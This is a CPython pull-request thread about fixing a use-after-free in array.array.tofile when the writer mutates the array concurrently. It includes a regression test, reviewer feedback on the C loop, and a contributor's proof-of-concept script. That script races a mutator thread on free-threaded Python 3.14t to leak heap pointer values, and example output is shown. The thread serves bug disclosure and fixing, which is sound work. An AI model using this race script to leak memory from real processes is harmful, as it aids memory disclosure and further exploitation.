pr.title: gh-142884: Fix UAF in `array.array.tofile` with concurrent mutations
pr.body:
the original code precomputed nblocks at the beginning of the function, but when a reentrant
writer cleared the array during the first callback, self->ob_item became NULL. The loop continued iterating based on the cached values and dereferenced the null pointer.

+    def test_tofile_concurrent_mutation(self):
+        # Prevent crash when a writer concurrently mutates the array.
+        # See https://github.com/python/cpython/issues/142884.
+        # Keep 'BLOCKSIZE' in sync with the array.tofile() C implementation.
+        BLOCKSIZE = 64 * 1024
+        victim = array.array('B', b'\0' * (BLOCKSIZE * 2))
+
+        class Writer:
+            def write(self, data):
+                victim.clear()
+                return 0
+
+        victim.tofile(Writer())  # should not crash
+

review_comments.body: Add a comment indicating that this must be kept in sync with the C code.

```suggestion
:mod:`array`: fix a crash in :mod:`array.array.tofile` when
the array is concurrently modified by the writer.
```
Don't use `const`, it's unnecessary in C.
Just don't change this part of the code (no need for `itesize` variable, just using `self->ob_descr->itemsize` is fine)
`Py_SSIZE_T_MAX / itemsize` is a constant that can be computed outside. In addition `Py_SIZE(self)` can be computed once instead of multiple times.

Maybe we should actually revert to the while loop. I was worried about the shrinking but I didn't consider the case when the array growed. Realistically we should support it even if it doesn't make sense. So `nblocks` shouldn't be counted anymore and we shold only rely on the remaining available bytes. Sorry for that.
Py_SIZE(self) may be changed in iteration, Py_SSIZE_T_MAX / itemsize can set outside the loop
I meant that `Py_SIZE(self)` from L1603 until L1621 will _never_ change. So you can have a single variable for that. It may only change after the call `PyObject_CallMethodOneArg` at the end.

review_comments.body: Why raise MemoryError? just break the loop. I think you can just do `while (total_size <= max_items)` as `max_items` doesn't change. This would simplify the loop.

@picnixz , as we move towards free-threading/GIL-less, I think this one is worth revisting due to the increased impact.  

TL;DR - you can probably use this on 3.14t or 3.15t to get heap pointers.

See the script below:
```
$ uv run --python 3.14t python x.py 2000
{"corruptions": 8, "ptrs": ["0x1545750", "0x40000", "0x1545750", "0x40000", "0x1545750", "0x40000", "0x1545750", "0x40000", "0x1545750", "0x40000", "0x1545750", "0x40000", "0x1545750", "0x40000", "0x1545750", "0x40000"], "n": 2000}
```

```
"""
Usage:
    uv run --python 3.14t python scripts/poc_array_tofile_race.py
    uv run --python 3.14t python scripts/poc_array_tofile_race.py 2000

See also: https://github.com/python/cpython/issues/142884
"""

import array, struct, sys, threading, os, json

os.sched_setaffinity(0, {0, 1})
ARRAY_SIZE = 256 * 1024
ITERATIONS = int(sys.argv[1]) if len(sys.argv) > 1 else 500
results = {"corruptions": 0, "ptrs": [], "n": 0}

class W:
    __slots__ = ("chunks",)
    def __init__(self): self.chunks = []
    def write(self, d):
        self.chunks.append(bytes(d))
        return len(d)

def mutator(v, stop):
    while not stop.is_set():
        try:
            v.frombytes(b'\xCC' * ARRAY_SIZE * 2)
            del v[ARRAY_SIZE:]
        except: pass

for attempt in range(ITERATIONS):
    a = array.array("b", b"\xAA" * ARRAY_SIZE)
    w = W()
    stop = threading.Event()
    t = threading.Thread(target=mutator, args=(a, stop), daemon=True)
    t.start()
    try:
        a.tofile(w)
    except: pass
    stop.set()
    t.join(timeout=1)
    results["n"] += 1
    for chunk in w.chunks:
        if not chunk: continue
        unexpected = set(chunk) - {0xAA, 0xCC, 0x00}
        if unexpected:
            results["corruptions"] += 1
            for off in range(0, min(64, len(chunk)), 8):
                val = struct.unpack("<Q", chunk[off:off+8])[0]
                if 0x1000 < val < 0x7fffffffffff:
                    results["ptrs"].append(hex(val))
            break

print(json.dumps(results), flush=True)
```

We will fix this as a regular bug fix and I do not have the bandwidth for it now. I will review the PR if I have time and if it can be merged. It will not necessarily have more impact as this requires a race while writing to the file, which is not necessarily common.
